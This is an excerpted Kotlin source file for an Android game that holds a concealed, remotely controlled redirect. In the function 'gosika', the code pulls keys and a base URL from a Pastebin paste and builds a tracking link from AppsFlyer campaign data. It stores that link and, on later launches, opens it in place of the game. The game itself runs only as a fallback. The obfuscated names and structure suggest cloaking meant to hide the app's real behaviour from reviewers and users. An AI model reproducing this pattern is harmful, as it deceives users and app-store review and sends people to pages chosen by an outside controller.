package com.gosinventarytet.debagovich.game
...
import com.gosinventarytet.debagovich.appContext
import com.gosinventarytet.debagovich.game.manager.MusicManager
import com.gosinventarytet.debagovich.game.manager.NavigationManager
...
import com.gosinventarytet.debagovich.game.manager.util.MusicUtil
import com.gosinventarytet.debagovich.game.manager.util.SoundUtil
import com.gosinventarytet.debagovich.game.manager.util.SpriteUtil
...
import com.gosinventarytet.debagovich.game.utils.advanced.AdvancedGame
import com.gosinventarytet.debagovich.game.utils.disposeAll
...
class GDXGame(val activity: MainActivity) : AdvancedGame() {
    ...
    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("GosInventar", MODE_PRIVATE)
...
//    val ds_Balance = DS_Balance(coroutine)
    ...
    private fun gosika() {
        ...
        val gorstka = sharedPreferences.getString("gorstka", "bab") ?: "bab"
        ...
        try {
            if (gorstka == "bab") {
                coroutine.launch(Dispatchers.Main) {
                    ...
                    if (simJSON != null) {
                        AppsFlyerLib.getInstance().init(simJSON.bab, getAppsFlyerConversionListener(simJSON.opa), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, simJSON.bab, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(gorstka)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
    ...
    private suspend fun requestGet() = CompletableDeferred<NameJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/QvWLdZKt"
        ...
        try {
            ...
            if (responseCode == HttpURLConnection.HTTP_OK) {
                ...
                val getJSON = NameJSON(
                    opa = jsonResponse.getString("opa") ?: "",
                    bab = jsonResponse.getString("bab") ?: "",
                )
    ...
    private data class NameJSON(val opa: String, val bab: String)
    ...
    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        ...
        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            ...
            if (appfMap != null) {
                ...
                val link = "$sma?aklnw=$campaign&mzkqlw=$afAd&qort=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("gorstka", link).apply() }
